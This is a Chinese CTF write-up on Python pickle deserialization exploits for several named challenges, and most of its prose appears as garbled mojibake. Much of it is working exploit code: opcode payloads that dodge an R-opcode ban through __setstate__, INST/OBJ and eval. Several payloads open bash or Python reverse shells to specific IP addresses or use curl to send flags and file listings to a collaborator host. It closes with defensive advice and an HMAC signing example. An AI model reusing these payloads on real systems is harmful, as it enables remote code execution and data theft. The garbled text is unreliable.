ä¹Ÿå°±ç›¸å½“äºä¸å¯ä»¥ç”¨__reduce__ï¼Œæœ‰ä»¥ä¸‹å‡ ç§åº”å¯¹æ–¹æ³•ï¼ˆä»¥ä¸‹æ–¹æ³•åŒæ ·å¯ä»¥å•ç‹¬ä½¿ç”¨é¸­ï¼ï¼ï¼ï¼‰ï¼Œå˜é‡è¦†ç›–ï¼ˆæ— ç›´æ¥ä»£ç æ‰§è¡Œï¼‰æˆ–åˆ©ç”¨b'i'ï¼Œb'i'ï¼Œb'b'è¿™äº›æ“ä½œç æ¥rceã€‚\n\u0026ndash;\u0026raquo;å˜é‡è¦†ç›–   æ —å­7 - [é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›2020] webtmp   ï¼ˆè¿™ä¸ªé¢˜æ˜¯ç¼åˆçš„[SJTU 2019]Pickle ä»¥åŠ [SJTU 2019]Pickle-Revengeçš„é¢˜ = =ã€‚é™åˆ¶äº†Ræ“ä½œç ï¼ŒåŒæ—¶é‡å†™find_class()é™åˆ¶å¼•å…¥æ¨¡å—ä¸º__main__ï¼Œä¸¤ä¸ªè€ƒç‚¹ï¼‰\nimport base64 import io import sys import pickle from flask import Flask, Response, render_template, request import secret app = Flask(__name__) class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f\u0026#39;Animal(name={self.name!r}, category={self.category!r})\u0026#39; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == \u0026#39;__main__\u0026#39;: return getattr(sys.modules[\u0026#39;__main__\u0026#39;], name) raise pickle.UnpicklingError(\u0026#34;global \u0026#39;%s.%s\u0026#39; is forbidden\u0026#34; % (module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def index(): if request.args.get(\u0026#39;source\u0026#39;): return Response(read(__file__), mimetype=\u0026#39;text/plain\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: try: pickle_data = request.form.get(\u0026#39;data\u0026#39;) if b\u0026#39;R\u0026#39; in base64.b64decode(pickle_data): return \u0026#39;No... I don\\\u0026#39;t like R-things. No Rabits, Rats, Roosters or RCEs.\u0026#39; else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return \u0026#39;Are you sure that is an animal???\u0026#39; correct = (result == Animal(secret.name, secret.category)) return render_template(\u0026#39;unpickle_result.html\u0026#39;, result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return \u0026#34;Something wrong\u0026#34; sample_obj = Animal(\u0026#39;ä¸€ç»™æˆ‘å“©giaogiao\u0026#39;, \u0026#39;Giao\u0026#39;) pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template(\u0026#39;unpickle_page.html\u0026#39;, sample_obj=sample_obj, pickle_data=pickle_data) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) çœ‹æºç ï¼Œopcodeéƒ¨åˆ†banæ‰äº†Ræ“ä½œç ï¼ˆè°ƒç”¨ä¸€ä¸ªcallableå¯¹è±¡ï¼‰ï¼Œä¸èƒ½ç”¨__reduce__äº†ï¼›ä¹Ÿé‡å†™äº†find_class()ï¼Œmoduleå¿…é¡»æ˜¯__main__ï¼›æˆ‘ä»¬çš„ç›®æ ‡æ˜¯\nrestricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)ä¸ºçœŸï¼Œå³correct==True\nè¿™é‡Œæˆ‘ä»¬é€šè¿‡åŠ è½½__main__.secretå¯ä»¥å¼•å…¥secretæ¨¡å—ï¼Œæ¥æŠŠsecret.nameå’Œsecret.categoryè¿™ä¸¤ä¸ªå˜é‡è¦†ç›–ä¸ºä»»æ„å­—ç¬¦ä¸²ï¼Œå†ä»¥è¿™ä¸ªå­—ç¬¦ä¸²ä¸ºå‚æ•°æ„é€ Animalå¯¹è±¡ï¼ˆæ ˆé¡¶å¯¹äºtypeçš„æ£€æŸ¥ï¼‰\npker\nsecret = GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;secret\u0026#39;) secret.name = \u0026#39;frieggs\u0026#39; secret.category = \u0026#39;frieggs\u0026#39; animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;, \u0026#39;frieggs\u0026#39;, \u0026#39;frieggs\u0026#39;) return animal # b\u0026#34;c__main__\\nsecret\\np0\\n0g0\\n(}(S\u0026#39;name\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ndtbg0\\n(}(S\u0026#39;category\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ndtb(S\u0026#39;frieggs\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ni__main__\\nAnimal\\np3\\n0g3\\n.\u0026#34; æˆ–è€…æ„é€ çš„exp.py\nimport pickle class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f\u0026#39;Animal(name={self.name!r}, category={self.category!r})\u0026#39; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category print(pickle.dumps(Animal(name=\u0026#34;x\u0026#34;, category=\u0026#34;y\u0026#34;), protocol=3)) # b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x01\\x00\\x00\\x00xq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; â€”â€”â€”â€”æ‰€ä»¥åœ¨ä¸å…è®¸b'R'çš„æƒ…å†µä¸‹ï¼Œæ€è·¯åˆ™æ˜¯ç¯¡æ”¹secretä¸­çš„nameå’Œcategoriyï¼Œå•çº¯çš„ç”¨b'c'å¼•å…¥æ¨¡å—å¯¹Animalè¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™ä¸€è¿‡ç¨‹ä¹Ÿç›¸å½“äºæ˜¯æ‰§è¡Œäº†å‡½æ•°\n ä¸€ç§è§£å†³åŠæ³•å°±æ˜¯è¿™ä¸ªæ —å­ä¸­çš„ï¼Œå¹²è„†å°±ä¸rceï¼Œè€Œæ˜¯ç”¨b'c'å˜é‡è¦†ç›–ï¼Œæ€è·¯å°±æ˜¯ä¸Šä¸ªä¸‰çº§æ ‡é¢˜ä¸‹é¢çš„é‚£ä¸ªå¤§æ®µï¼Œä¸å†èµ˜è¿°ã€‚\n\u0026ndash;\u0026raquo;ä½¿ç”¨__setstate__\u0026amp;b'b'å®ç°rce å¦ä¸€ç§æ–¹å¼æ˜¯ç”¨BUILDæŒ‡ä»¤b'b'åŠè¿›è¡Œrceã€‚\nåœ¨pickleæºç ä¸­BUILDæŒ‡ä»¤æ˜¯è¿™æ ·çš„\nå¦‚æœä¸€ä¸ªå®ä¾‹instæ‹¥æœ‰__setstate__æ–¹æ³•ï¼Œåˆ™æŠŠstateäº¤ç»™__setstate__æ–¹æ³•æ¥å¤„ç†ï¼›å¦åˆ™ç›´æ¥æŠŠstateè¿™ä¸ªdistçš„å†…å®¹åˆå¹¶åˆ°inst.__dict__ å†…ã€‚\nå¦‚æœä¸€ä¸ªç±»åŸæœ¬æ²¡æœ‰__setstate__è¿™ä¸ªæ–¹æ³•ï¼Œå½“æˆ‘ä»¬ç”¨{'__setstate__': os.system}æ¥BUILDè¿™ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆç°åœ¨å¯¹è±¡çš„__setstate__å°±å˜æˆäº†os.systemï¼›æ¥ä¸‹æ¥åˆ©ç”¨\u0026quot;ls /\u0026quot;æ¥å†æ¬¡BUILDè¿™ä¸ªå¯¹è±¡ï¼Œåˆ™ä¼šæ‰§è¡Œsetstate(\u0026quot;ls /\u0026quot;) ï¼Œè€Œæ­¤æ—¶__setstate__å·²ç»è¢«æˆ‘ä»¬è®¾ç½®ä¸ºos.systemï¼Œå› æ­¤å®ç°äº†rce\nimport pickle import os class Student(): def __init__(self): self.name = \u0026#39;amelia\u0026#39; self.grade = \u0026#39;A1\u0026#39; payload = b\u0026#39;\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.\u0026#39; # shell = b\u0026#34;\u0026#34;\u0026#34;\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubS\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;\\nb.\u0026#34;\u0026#34;\u0026#34; pickle.loads(payload) å¯ä»¥çœ‹åˆ°æˆåŠŸåšåˆ°äº†rce~~åå¼¹shellå½“ç„¶ä¹Ÿå¯ä»¥\n\u0026ndash;\u0026raquo;ä½¿ç”¨_instantiate()\u0026amp;load_obj()\u0026amp;load_inst()\u0026amp;b'o'\u0026amp;b'i'å®ç°rce   _instantiate(): Create a new object via klass(*args); Leads to arbitrary function call actually\n  def _instantiate(self, klass, args): if (args or not isinstance(klass, type) or hasattr(klass, \u0026#34;__getinitargs__\u0026#34;)): try: # Arbitrary function all value = klass(*args) except TypeError as err: raise TypeError(\u0026#34;in constructor for %s: %s\u0026#34; % (klass.__name__, str(err)), sys.exc_info()[2]) else: value = klass.__new__(klass) self.append(value)     load_obj()\n  def load_obj(self): # Stack is ... markobject classobject arg1 arg2 ... args = self.pop_mark() cls = args.pop(0) self._instantiate(cls, args) dispatch[OBJ[0]] = load_obj     load_inst()\n  def load_inst(self): # read from user input module = self.readline()[:-1].decode(\u0026#34;ascii\u0026#34;) name = self.readline()[:-1].decode(\u0026#34;ascii\u0026#34;) klass = self.find_class(module, name) # get args from stack args = self.pop_mark() self._instantiate(klass, args) dispatch[INST[0]] = load_inst     exp.py\nimport pickle import struct import base64 def exploit(command): assert type(command) is list payload_prefix = b\u0026#39;\u0026#39;\u0026#39;((\u0026#39;\u0026#39;\u0026#39; payload_suffix = b\u0026#39;\u0026#39;\u0026#39;lisubprocess\\nPopen\\n.\u0026#39;\u0026#39;\u0026#39; payload_body = bytes() for c in command: payload_body += b\u0026#34;X\u0026#34; + bytes(struct.pack(\u0026#34;\u0026lt;I\u0026#34;, len(c))) + bytes(c, encoding=\u0026#34;utf-8\u0026#34;) payload = payload_prefix + payload_body + payload_suffix assert b\u0026#39;R\u0026#39; not in payload return payload def main(): payload = exploit([ \u0026#34;python\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;print(\u0026#39;pwned!\u0026#39;)\u0026#34; ]) print(\u0026#34;Payload:\u0026#34;, payload) print(\u0026#34;Length:\u0026#34;, len(payload)) print(\u0026#34;Base64:\u0026#34;, base64.b64encode(payload)) x = pickle.loads(payload) print(x) if __name__ == \u0026#34;__main__\u0026#34;: main() # åå¼¹shellå½“ç„¶ä¹Ÿå¯ éƒ½è¯´äº†æ˜¯rceäº† import sys,socket,os,pty s=socket.socket() s.connect((\u0026#34;182.92.191.192\u0026#34;,50000)) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(\u0026#34;/bin/sh\u0026#34;) payload = exploit([ \u0026#34;python\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#39;import sys,socket,os,pty;s=socket.socket();s.connect((\u0026#34;8.8.8.8\u0026#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39;, ])   æ —å­8 - [å·…å³°æå®¢ 2021]opcode   é¦–é¡µæ˜¯ç™»å½•æ¡†ï¼Œä»»æ„å€¼å‡å¯ç™»å…¥ æ˜é¢ä¸Šæ²¡ä»€ä¹ˆä¸œè¥¿ æŠ“åŒ…åçœ‹åˆ°postä¼ å…¥å‚æ•°æœ‰ä¸‰ä¸ª username, password, imagePathï¼Œè¿™é‡Œçš„imagePathä¹Ÿå¯è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œçœ‹ä¸€ä¸‹åç«¯æºç \nç¬¬ä¸€çœ¼çœ‹è¿‡å»æ˜¯pç‰›çš„é¢˜å’Œå¦ä¸€ä¸ªé¢˜çš„æ‚äº¤äº†ï¼Œé™åˆ¶builtinså¹¶ä¸”ä¸èƒ½æœ‰Ræ“ä½œç ï¼Œå…¥å£å¤„åœ¨44è¡Œçš„session['data']å¤„\nä½†æ˜¯æˆ‘æ²¡ä»”ç»†æ³¨æ„çš„åœ°æ–¹æ˜¯17è¡Œï¼Œè·Ÿpç‰›çš„é‚£ä¸ªé¢˜ä¸€å¯¹æ¯”å°±èƒ½çœ‹å‡ºæ¥è¿™æ ·çš„å†™æ³•å› ä¸ºæ˜¯å•ç‹¬çš„defè€Œä¸æ˜¯åœ¨å¯¹PickleSerializerè¿›è¡Œä¿®æ”¹ï¼Œå®Œå…¨åšä¸åˆ°é‡å†™pickle.loadsæ–¹æ³•ï¼Œåªæ˜¯ä¸ªæ‘†è®¾ï¼Œç›¸å½“äºä»…å¯¹Ræ“ä½œç è¿›è¡Œäº†é™åˆ¶ï¼Œç¬‘å˜»äº†\nç›´æ¥ä¸Ševal()+b'o'æ¥å¼¹shelläº†ï¼Œä¸å¤šbb\n(cbuiltins eval S\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\\\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/101.35.113.107/8426 0\u0026amp;1\u0026#34;\\\u0026#39;)\u0026#39; o. æˆ–è€…æ˜¯ç”¨system()+curl+b'o'å¤–å¸¦flag\n(cos system S\u0026#39;curl burp_collaborator.net/?flag=`app/readflag`\u0026#39; o. ç„¶åç”Ÿæˆb64çš„å†…å®¹ï¼ˆç”¨'''çš„å¥½å¤„æ˜¯ä¸ç”¨è€ƒè™‘å¤ªå¤šå¼•å·è½¬ä¹‰çš„é—®é¢˜\nimport base64 data = b\u0026#39;\u0026#39;\u0026#39;xxxxxxxxxxxxxx\u0026#39;\u0026#39;\u0026#39; print(base64.b64encode(data)) cookieçš„ç”Ÿæˆå°±æ˜¯flask_session_cookie_managerä¸€æŠŠæ¢­äº†\n$ python3 flask_session_cookie_manager3.py encode -s \u0026#39;y0u-wi11_neuer_kn0vv-!@#se%32\u0026#39; -t \u0026#39;{\u0026#34;data\u0026#34;: \u0026#34;xxxxb64_contentxxxx\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;adminadmin\u0026#34;}\u0026#39; â€”â€”â€”â€”å¦‚æœæŒ‰ç…§é¢˜ç›®åŸæœ‰çš„æ„æ€ï¼Œé™åˆ¶builtins+b'R'æ“ä½œç ä¹Ÿæ˜¯å¾ˆå¥½åšå‡ºæ¥çš„\nå…ˆç”¨pkerç”Ÿæˆå¸¦Rçš„opcode\ngetattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) dict = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;dict\u0026#39;) dict_get = getattr(dict, \u0026#39;get\u0026#39;) globals = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;globals\u0026#39;) builtins = globals() __builtins__ = dict_get(builtins, \u0026#39;__builtins__\u0026#39;) eval = getattr(__builtins__, \u0026#39;eval\u0026#39;) eval(\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;) return # b\u0026#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\\u0026#39;get\\\u0026#39;\\ntRp2\\n0cbuiltins\\nglobals\\np3\\n0g3\\n(tRp4\\n0g2\\n(g4\\nS\\\u0026#39;__builtins__\\\u0026#39;\\ntRp5\\n0g0\\n(g5\\nS\\\u0026#39;eval\\\u0026#39;\\ntRp6\\n0g6\\n(S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\\\u0026#39;\\ntR.\u0026#39; ç„¶åæ‰‹æ“ï¼Œåœ¨è°ƒç”¨callableå‰æ·»åŠ MARKå³(ï¼Œå»æ‰tå’Œè°ƒç”¨tç”¨åˆ°çš„MARK\nä¹Ÿå°±æ˜¯[callable] [tuple] R===\u0026gt;MARK [callable] [args...] o\nb'''cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0(g0\\ng1\\nS'get'\\nop2\\n0cbuiltins\\nglobals\\np3\\n0(g3\\nop4\\n0(g2\\ng4\\nS'__builtins__'\\nop5\\n0(g0\\ng5\\nS'eval'\\nop6\\n0(g6\\nS'__import__(\u0026quot;os\u0026quot;).system(\u0026quot;whoami\u0026quot;)'\\no.''' å¯ä»¥çœ‹ä¸‹åŒºåˆ«\nä¿®æ”¹éƒ½æ˜¯ä¸€å¯¹ä¸€å¯¹çš„ï¼Œæ€»ç»“ä¸€ä¸‹æ–¹æ³•å°±æ˜¯0gxè¦å˜ä¸º0(gxï¼Œ(gxè¦å˜ä¸ºgx ï¼ŒtRæ¢æˆo\nå‚è€ƒï¼šwp\n \u0026ndash;\u0026raquo;ä½¿ç”¨_getattribute()\u0026amp;load_obj()\u0026amp;load_inst()å®ç°ä»»æ„æ–‡ä»¶è¯»å–   find_class()\n  def find_class(self, module, name): # Subclasses may override this. sys.audit(\u0026#39;pickle.find_class\u0026#39;, module, name) if self.proto \u0026lt; 3 and self.fix_imports: if (module, name) in _compat_pickle.NAME_MAPPING: module, name = _compat_pickle.NAME_MAPPING[(module, name)] elif module in _compat_pickle.IMPORT_MAPPING: module = _compat_pickle.IMPORT_MAPPING[module] __import__(module, level=0) if self.proto \u0026gt;= 4: return _getattribute(sys.modules[module], name)[0] else: return getattr(sys.modules[module], name)     _getattribute()\n  def _getattribute(obj, name): for subpath in name.split(\u0026#39;.\u0026#39;): if subpath == \u0026#39;\u0026lt;locals\u0026gt;\u0026#39;: raise AttributeError(\u0026#34;Can\u0026#39;t get local attribute {!r}on {!r}\u0026#34; .format(name, obj)) try: parent = obj obj = getattr(obj, subpath) except AttributeError: raise AttributeError(\u0026#34;Can\u0026#39;t get attribute {!r}on {!r}\u0026#34; .format(name, obj)) from None return obj, parent     read()\n  def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read()     ä»ç„¶ä»¥ä¸Šé¢webtmp(ç©¶æç¼åˆæ€ª)çš„é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸Šé¢çš„å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªAnimalçš„å®ä¾‹ï¼Œç„¶åå°†nameæˆ–categoryçš„å€¼è®¾ç½®ä¸ºread wrapperçš„è¿”å›å€¼\nexp.py\nimport pickle import struct import base64 def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() def exploit(filename): payload_prefix = b\u0026#39;\u0026#39;\u0026#39;(\u0026#39;\u0026#39;\u0026#39; payload_body = b\u0026#34;X\u0026#34; + bytes(struct.pack(\u0026#34;\u0026lt;I\u0026#34;, len(filename))) + bytes(filename, encoding=\u0026#34;utf-8\u0026#34;) payload_suffix = b\u0026#39;\u0026#39;\u0026#39;i__main__\\nread\\n.\u0026#39;\u0026#39;\u0026#39; payload = payload_prefix + payload_body + payload_suffix assert b\u0026#39;R\u0026#39; not in payload return payload def main(): payload = exploit(\u0026#34;flag\u0026#34;) print(\u0026#34;Payload:\u0026#34;, payload) # b\u0026#39;(X\\x04\\x00\\x00\\x00flagi__main__\\nread\\n.\u0026#39; print(\u0026#34;Length:\u0026#34;, len(payload)) print(\u0026#34;Base64:\u0026#34;, base64.b64encode(payload)) if __name__ == \u0026#34;__main__\u0026#34;: main() å†æŠŠè¿™ä¸€éƒ¨åˆ†çš„payloadç¼åˆåˆ°åˆ›å»ºAnimalå®ä¾‹çš„Opcodeä¸­å»\n# åŸ: name=\u0026#39;x\u0026#39;,category=\u0026#39;y\u0026#39; b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x01\\x00\\x00\\x00xq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; # ç¼åˆ åº”è¯¥èƒ½çœ‹å‡ºæ¥æ”¹åœ¨å“ªé‡Œäº† b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03(X\\x04\\x00\\x00\\x00flagi__main__\\nread\\nq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; ä¸€äº›å°æŠ€å·§\u0026amp;æ³¨æ„äº‹é¡¹  å½“æŠŠpayloadä½œä¸ºgetå‚æ•°è¯·æ±‚æ—¶ï¼Œurlç¼–ç æ³¨æ„æ¢è¡Œç¬¦æ˜¯%0Aè€Œä¸æ˜¯%0D%0A å¯¹payloadè¿›è¡Œb64åŠ å¯†æ—¶ï¼Œæ³¨æ„åˆ«æŠŠ\\nç»™å•ç‹¬ç¼–ç äº†ï¼ˆä¸è¿‡æ­£å¸¸éƒ½ä¸ä¼šï¼‰ å…¶ä»–æ¨¡å—çš„loadä¹Ÿå¯ä»¥è§¦å‘pickleååºåˆ—åŒ–æ¼æ´  ä¾‹å¦‚ï¼šnumpy.load()å…ˆå°è¯•ä»¥numpyè‡ªå·±çš„æ•°æ®æ ¼å¼å¯¼å…¥ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™å°è¯•ä»¥pickleçš„æ ¼å¼å¯¼å…¥ï¼›pandas.read_pickle()ç›´æ¥ä½¿ç”¨pickle.load()æ–¹æ³•\n çµæ´»è¿ç”¨burp collaborator  è™½ç„¶æˆ‘ä»¬ä¸èƒ½æŠŠburpæä¾›çš„collaboratorå½“ä½œvpsæ¥ä½¿ç”¨ï¼Œè¿›è¡Œåå¼¹shellç„¶åä¸€é€šæ“ä½œï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå¼•å·+curlçš„æ–¹å¼ç›´æ¥è·å¾—ä»£ç æ‰§è¡Œå’Œç»“æœçš„è¾“å‡ºï¼›curlæœ¬èº«çš„ç”¨æ³•ä¹Ÿå¾ˆå¤šï¼Œå¯ä»¥ç›´æ¥å¸¦æ–‡ä»¶è¿›è¡Œpostï¼Œæ›´å¤šå†…å®¹å‚è§ï¼šcurl çš„ç”¨æ³•æŒ‡å—\n# åŸºæ“1 os.system(\u0026#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`) # åŸºæ“2 -då‚æ•°å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹ä½œä¸ºæ•°æ®ä½“å‘é€ï¼Œä¼šè‡ªåŠ¨æ·»åŠ è¯·æ±‚å¤´å¹¶è°ƒæ•´è¯·æ±‚æ–¹æ³• æ— éœ€-X POST os.system(\u0026#39;curl -d \u0026#39;@/flag.txt\u0026#39; http://xxxx.burpcollaborator.net/) æœ€åï¼Œå‡ºäºå®‰å…¨è§’åº¦çš„è€ƒé‡   ç¦ç”¨pickleï¼Œä½¿ç”¨Jsonæˆ–Google Protocol Buffers\n  å½“ç¡®å®éœ€è¦ä½¿ç”¨pickleæ—¶ï¼Œè¦ç¡®ä¿å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚é‡å†™find_class()ï¼ˆä½¿ç”¨ç™½åå•è€Œä¸æ˜¯é»‘åå•è¿›è¡Œè¿‡æ»¤ï¼‰ã€ç¦æ­¢æŸäº›æ“ä½œç¬¦ï¼›ç”±äºåœ¨å¯¹opcodeè¿›è¡Œååºåˆ—åŒ–æ—¶å¯èƒ½ä¼šé€ æˆä»»æ„æ–‡ä»¶è¯»å†™ï¼Œä¸€å®šæå‰å¯¹é‡è¦æ–‡ä»¶åšå¥½æƒé™çš„ç®¡ç†ï¼›å¿…è¦æ—¶å¯ä»¥å¯¹ä¿¡æ¯è¿›è¡Œhmacç­¾å\n  ä¸¾ä¸€ä¸ªhmacçš„æ —å­\nimport hmac import pickle import base64 class Student: def __init__(self, name, age): self.name = name self.age = age def __str__(self): return \u0026#34;My name is %s, I am %dyears old.\u0026#34; % ( self.name, self.age ) class HMAC_Pickler: def __init__(self, secret_key, seperator=\u0026#34;|\u0026#34;): self.secret_key = secret_key self.seperator = seperator def digital_signature(self, data): signer = hmac.new(self.secret_key) signer.update(data) return signer.hexdigest() def loads(self, data): sign = data[:32] p = data[32+len(self.seperator):] assert sign == self.digital_signature(p), (\u0026#34;Data is tampered by someone.\u0026#34;) return pickle.loads(p) def dumps(self, obj): p = pickle.dumps(obj) sign = self.digital_signature(p) return \u0026#34;%s%s%s\u0026#34; % (sign, self.seperator, p) def main(): SECRET_KEY = b\u0026#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f\u0026#39; pickler = HMAC_Pickler(SECRET_KEY) obj = Student(\u0026#34;Jack\u0026#34;, 19) print(obj) p = pickler.dumps(obj) print(p) o = pickler.loads(p) print(o) p += \u0026#34;I am hacker, trying evil things\u0026#34; x = pickler.loads(p) print(x) if __name__ == \u0026#34;__main__\u0026#34;: main()     æ —å­9 - [BalsnCTF 2019] Pyshv3   è¿™æ¬¡çš„find_class()æ²¡æœ‰å˜åŒ–ï¼Œä½†æ˜¯structsæœ‰å…·ä½“çš„å®ç°\nåŒæ—¶server.pyçš„é€»è¾‘ä¹Ÿå‘ç”Ÿäº†å˜åŒ–ï¼Œä¸ç”¨rceäº†ï¼Œç›´æ¥æœ‰ä¸€ä¸ªæ‹¿flagçš„å‡½æ•°ï¼Œä½†éœ€è¦self.user.privilegedä¸ºTrueæ‰å¯ä»¥è¿”å›\nè€Œè¿™ä¸ªself.user.privilegedåœ¨ä¸€å¼€å§‹å°±è¢«è®¾ä¸ºäº†False\nemmmm è¿™æ€ä¹ˆç»•è¿‡æï¼Ÿ\nå…ˆè¯´éé¢„æœŸï¼Œå°†__builtins__å¤åˆ¶åˆ°moduleså±æ€§ä¸Šï¼›å†è¯´è¯´é¢„æœŸè§£ã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œæœ‰__get__ï¼Œ__set__è¿™æ ·æè¿°å™¨åè®®æ–¹æ³•çš„å¯¹è±¡ç§°ä¸ºæè¿°å™¨descriptorã€‚é»˜è®¤å¯¹å±æ€§çš„è®¿é—®æ§åˆ¶éƒ½æ˜¯ä»å¯¹è±¡çš„å­—å…¸__dict__é‡Œé¢è¿›è¡Œè·å–(get)ï¼Œè®¾ç½®(set)å’Œåˆ é™¤(delete)çš„æ–¹æ³•ï¼ˆå‰é¢çš„é‚£é“é¢˜ä¹Ÿç”¨åˆ°è¿™ä¸ªç‚¹ï¼‰ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œa.xçš„æŸ¥æ‰¾é¡ºåºæ˜¯a.__dict__['x']ï¼Œä¹‹åtype(a).__dict__['x']ï¼Œç„¶åæ‰¾type(a)çš„çˆ¶ç±»ã€‚å¦‚æœæŸ¥æ‰¾åˆ°çš„å€¼æ˜¯ä¸€ä¸ªæè¿°å™¨ï¼Œpythonå°±ä¼šè°ƒç”¨æè¿°å™¨çš„æ–¹æ³•æ¥é‡å†™é»˜è®¤çš„æ§åˆ¶è¡Œä¸ºï¼Œè¿™ä¸ªé‡å†™å‘ç”Ÿåœ¨è¿™ä¸ªæŸ¥æ‰¾ç¯èŠ‚çš„å“ªé‡Œå–å†³äºå®šä¹‰äº†å“ªä¸ªæè¿°å™¨æ–¹æ³•ã€‚ï¼ˆæ³¨æ„ï¼šåªæœ‰åœ¨æ–°å¼ç±»ä¸­æ—¶æè¿°å™¨æ‰èµ·ä½œç”¨ï¼‰ï¼ˆæ›´å¤šä»‹ç»å‚è§ï¼šä»€ä¹ˆæ˜¯æè¿°ç¬¦ï¼ˆdescriptorï¼‰ï¼‰\næˆ‘ä»¬åˆ©ç”¨æè¿°å™¨çš„ç‰¹æ€§ï¼Œå°†Userç±»çš„__set__æ–¹æ³•é‡è½½ä¸ºstructs.Userï¼Œå¹¶æŠŠå®ƒçš„privilegedå±æ€§èµ‹å€¼ä¸ºä¸€ä¸ªUserå®ä¾‹ã€‚å½“è¿›è¡Œself.user.privilegedè¢«èµ‹å€¼æ—¶è§¦å‘__set__ï¼Œä½†ç”±äºå·²ç»è¢«é‡å†™ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«èµ‹å€¼Falseï¼Œè€Œæ˜¯ä¿æŒåŸæ ·ï¼Œè¿˜æ˜¯ä¸€ä¸ªUserå®ä¾‹ã€‚åœ¨åé¢ifåˆ¤æ–­æ—¶ï¼ŒUserå®ä¾‹å½“ç„¶æ˜¯Trueï¼Œå°±å¯ä»¥ç»•è¿‡äº†ã€‚\npker\nUser = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;User\u0026#39;) User.__set__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;User\u0026#39;) user = User(0, 0) User.privileged = user return user opcode\nb\u0026quot;cstructs\\nUser\\np0\\n0g0\\n(}(S'__set__'\\ncstructs\\nUser\\ndtbg0\\n(I0\\nI0\\ntRp2\\n0g0\\n(}(S'privileged'\\ng2\\ndtbg2\\n.\u0026quot;  